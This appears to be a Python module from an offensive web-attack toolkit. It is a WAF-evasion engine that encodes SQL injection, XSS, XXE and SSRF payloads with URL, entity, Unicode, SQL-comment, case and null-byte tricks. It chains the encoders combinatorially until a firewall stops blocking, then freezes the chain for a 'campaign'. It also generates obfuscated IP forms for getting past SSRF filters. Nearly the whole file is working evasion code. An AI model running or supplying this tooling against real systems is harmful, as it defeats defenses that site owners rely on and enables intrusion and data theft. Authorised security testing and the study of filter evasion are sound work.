"""
Unrestricted payload obfuscation engine.

Every encoding technique gets applied per vulnerability class; chains are
composed combinatorially and tested until the WAF stops blocking, then
frozen for the whole campaign.

Encoder categories:
  - URL encoding (single, double)
  - HTML entity encoding (hex, decimal)
  - Unicode (fullwidth, zero-width insertion)
  - SQL-specific (inline comments, versioned comments, tab/newline)
  - Case manipulation
  - IP representation variants (for SSRF)
"""
from __future__ import annotations

from itertools import product
from typing import Callable, Generator
from urllib.parse import quote

import structlog

logger = structlog.get_logger(__name__)


# ── Individual Encoders ──────────────────────────────────────────────────────

def enc_url(payload: str) -> str:
    """Single URL encoding."""
    return quote(payload, safe="")


def enc_double_url(payload: str) -> str:
    """Double URL encoding — bypasses single-decode WAF filters."""
    return quote(quote(payload, safe=""), safe="")


def enc_hex_entity(payload: str) -> str:
    """HTML hex entity encoding: a -> &#x61;"""
    return "".join(f"&#x{ord(c):x};" for c in payload)


def enc_decimal_entity(payload: str) -> str:
    """HTML decimal entity encoding: a -> &#97;"""
    return "".join(f"&#{ord(c)};" for c in payload)


def enc_fullwidth(payload: str) -> str:
    """Fullwidth Unicode substitution: ASCII range maps to U+FF00 block."""
    _map = {}
    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
        _map[ord(c)] = chr(0xFF00 + ord(c) - 0x20)
    return payload.translate(_map)


def enc_mixed_case(payload: str) -> str:
    """Alternating case: sElEcT, UnIoN — defeats case-sensitive filters."""
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))


def enc_sql_comments(payload: str) -> str:
    """Replace spaces with inline SQL comments: /**/ — classic WAF bypass."""
    return payload.replace(" ", "/**/").replace("SELECT", "SEL/**/ECT").replace("UNION", "UNI/**/ON")


def enc_mysql_versioned(payload: str) -> str:
    """MySQL versioned comments: /*!50000SELECT*/ — executes on MySQL >= 5.0."""
    return (
        payload
        .replace("UNION", "/*!50000UNION*/")
        .replace("SELECT", "/*!50000SELECT*/")
        .replace("FROM", "/*!50000FROM*/")
        .replace("WHERE", "/*!50000WHERE*/")
    )


def enc_tab_newline(payload: str) -> str:
    """Replace spaces with tabs and append newline — evades space-based filters."""
    return payload.replace(" ", "\t") + "\n"


def enc_url_tab_newline(payload: str) -> str:
    """URL-encoded tab/newline variant."""
    return payload.replace(" ", "%09") + "%0a"


def enc_null_byte(payload: str) -> str:
    """Null byte insertion — can terminate string processing in some parsers."""
    return payload + "%00"


def enc_unicode_normalize(payload: str) -> str:
    """Unicode normalization bypass: homoglyphs and combining marks."""
    _homoglyphs = {"a": "\u0430", "e": "\u0435", "o": "\u043e", "c": "\u0441"}
    return "".join(_homoglyphs.get(c, c) for c in payload)


def enc_zero_width(payload: str) -> str:
    """Zero-width character insertion — invisible to humans, breaks WAF regex."""
    zwsp = "\u200b"  # zero-width space
    result = []
    for i, c in enumerate(payload):
        result.append(c)
        if i % 3 == 1:  # insert periodically
            result.append(zwsp)
    return "".join(result)


def enc_html_tag_case(payload: str) -> str:
    """XSS-specific: mixed case HTML tags."""
    import re
    return re.sub(
        r"<(/?\w+)",
        lambda m: "<" + enc_mixed_case(m.group(1)),
        payload,
    )


def enc_xss_event_variant(payload: str) -> str:
    """XSS: convert script tags to event handler variants."""
    return (
        payload
        .replace("<script>", '<img src=x onerror="')
        .replace("</script>", '">')
        .replace("alert", "al\\u0065rt")
    )


def enc_xxe_whitespace(payload: str) -> str:
    """XXE: insert whitespace/newlines to break WAF pattern matching."""
    return (
        payload
        .replace("<!DOCTYPE", "<!DOCTYPE\n")
        .replace("SYSTEM", "SYSTEM\n\t")
        .replace("<!ENTITY", "<!ENTITY\n")
    )


# ── IP Representation Variants (for SSRF) ───────────────────────────────────

def ip_variants(ip: str = "127.0.0.1") -> list[str]:
    """Generate alternative representations of an IP address.

    Many SSRF filters only block the dotted-decimal form. These variants
    use hex, decimal, octal, IPv6-mapped, and other representations that
    resolve to the same address.
    """
    parts = ip.split(".")
    if len(parts) != 4:
        return [ip]

    a, b, c, d = map(int, parts)
    decimal_ip = a * 256**3 + b * 256**2 + c * 256 + d

    return sorted(set([
        ip,                                                    # standard dotted decimal
        f"0x{a:02x}.0x{b:02x}.0x{c:02x}.0x{d:02x}",         # hex octets
        str(decimal_ip),                                       # full decimal
        f"0{a:o}.0{b:o}.0{c:o}.0{d:o}",                      # octal octets
        f"[::ffff:{a}.{b}.{c}.{d}]",                          # IPv6-mapped IPv4
        f"0x{decimal_ip:08x}",                                 # single hex number
        f"{a}.{b}.{c * 256 + d}",                             # class B notation
        f"{a}.{b * 65536 + c * 256 + d}",                     # class A notation
    ]), key=len)


# ── Per-Class Encoder Chains ────────────────────────────────────────────────

CHAINS: dict[str, list[Callable[[str], str]]] = {
    "sqli": [
        enc_mysql_versioned,
        enc_sql_comments,
        enc_url,
        enc_double_url,
        enc_tab_newline,
        enc_url_tab_newline,
        enc_mixed_case,
        enc_null_byte,
    ],
    "xss": [
        enc_hex_entity,
        enc_decimal_entity,
        enc_fullwidth,
        enc_html_tag_case,
        enc_xss_event_variant,
        enc_zero_width,
        enc_url,
        enc_double_url,
    ],
    "xxe": [
        enc_xxe_whitespace,
        enc_url,
        enc_double_url,
        enc_unicode_normalize,
    ],
    "ssrf": [
        enc_url,
        enc_double_url,
        enc_unicode_normalize,
    ],
    "csrf": [enc_url],
    "idor": [enc_url],
    "jwt": [enc_url],
    "authn": [enc_url],
    "session": [enc_url],
}


def get_encoder_name(fn: Callable) -> str:
    """Get a human-readable name for an encoder function."""
    return getattr(fn, "__name__", str(fn))


def build_chain(
    payload: str,
    vuln_class: str,
    depth: int = 2,
) -> Generator[tuple[str, str], None, None]:
    """Yield (chain_name, encoded_payload) for all compositions up to `depth` encoders.

    Combinatorially applies encoders from the vuln_class-specific chain list.
    For depth=2 with N encoders, yields N + N² variants.

    Args:
        payload: The raw payload to encode.
        vuln_class: Vulnerability class to select encoder chain.
        depth: Maximum number of encoders to compose (default 2).

    Yields:
        (chain_name, encoded_payload) tuples.
    """
    encoders = CHAINS.get(vuln_class, [enc_url])

    for n in range(1, depth + 1):
        for combo in product(encoders, repeat=n):
            out = payload
            for fn in combo:
                try:
                    out = fn(out)
                except Exception:
                    continue
            chain_name = "+".join(get_encoder_name(fn) for fn in combo)
            yield chain_name, out


def apply_chain(payload: str, chain_names: list[str]) -> str:
    """Apply a specific named encoder chain to a payload.

    Used to re-apply a frozen chain to new payloads.
    """
    name_to_fn = {
        "enc_url": enc_url,
        "enc_double_url": enc_double_url,
        "enc_hex_entity": enc_hex_entity,
        "enc_decimal_entity": enc_decimal_entity,
        "enc_fullwidth": enc_fullwidth,
        "enc_mixed_case": enc_mixed_case,
        "enc_sql_comments": enc_sql_comments,
        "enc_mysql_versioned": enc_mysql_versioned,
        "enc_tab_newline": enc_tab_newline,
        "enc_url_tab_newline": enc_url_tab_newline,
        "enc_null_byte": enc_null_byte,
        "enc_unicode_normalize": enc_unicode_normalize,
        "enc_zero_width": enc_zero_width,
        "enc_html_tag_case": enc_html_tag_case,
        "enc_xss_event_variant": enc_xss_event_variant,
        "enc_xxe_whitespace": enc_xxe_whitespace,
    }

    out = payload
    for name in chain_names:
        fn = name_to_fn.get(name)
        if fn:
            out = fn(out)
    return out
